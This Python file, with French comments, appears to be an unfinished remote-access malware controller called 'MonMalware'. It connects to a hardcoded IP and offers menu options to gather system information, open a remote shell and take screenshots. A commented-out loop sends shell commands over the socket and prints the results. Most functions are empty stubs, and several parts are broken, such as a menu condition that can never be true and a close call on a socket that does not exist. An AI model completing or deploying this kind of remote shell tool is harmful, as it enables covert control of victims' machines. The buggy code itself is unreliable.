# coding=utf-8
import socket, sys, os, time, threading


VICTIME_IP = "" # ? Peut-on la modifier en ligne 19?


# classe concernant le malware
class MonMalware():
    '''




    '''


    MALWARE_IP = "10.101.204.172" # ON SUPPOSE LA CONNAISSANCE DE L'IP DE LA VICTIME
    DEFAULT_PORT = 80

    def __init__(self, port: int=DEFAULT_PORT, host: str=MALWARE_IP):
        self.client_port = port
        self.malware_ip = host
        
        

    def connection(self):
        conn = socket.socket()
        conn.connect((self.malware_ip,self.client_port))

        try:
            
            
            print("Client : %s" %VICTIME_IP)
            self.affichageMenu()

        except socket.timeout:
            self.disconnect()
            print("[!] Aucune réponse du client.")
        except:
            self.disconnect()
            print("[!] Erreur lors de la connexion.")

    def disconnect(self ):
        self.server_socket.close()
        print("Fermeture de la connexion.")

    #
    def affichageMenu(self):

        choix = -1
        while choix != 0:
            while choix < 0 and choix > 3:
                print("0 : Quitter l'application")
                print("1 : Récupérer les informations systèmes")
                print("2 : Envoyer une commande (Remote Shell)")
                print("3 : Capture d'écran ")
            if choix == 0:
                pass
            elif choix == 1:
                self.obtenirInformations()
            elif choix == 2:
                self.affichageMenuShell()
            elif choix == 3:
                self.captureEcran()

    def obtenirInformations(self):

        
        pass

    def affichageMenuShell(self):
        pass

    def captureEcran(self):
        pass
# Toutes les commandes

class Commands():
    pass
    '''




    ENCODING = 'UTF-8'
    while True:
        command = input("#>")
        if command != "exit()":
            if command == "":
                continue

            conn.send(command.encode(ENCODING))
            result = conn.recv(1024).decode(ENCODING)
            total_size = len(result[:16])
            result = result[16:]

            while total_size > len(result):
                data = conn.recv(1024)
                result += data
            print(result)
            print("\n")

        else:
            conn.send("exit()")
            print("Connexion fermée")
    break

    '''


concombre = MonMalware(50000)
concombre.connection()
concombre.disconnect()
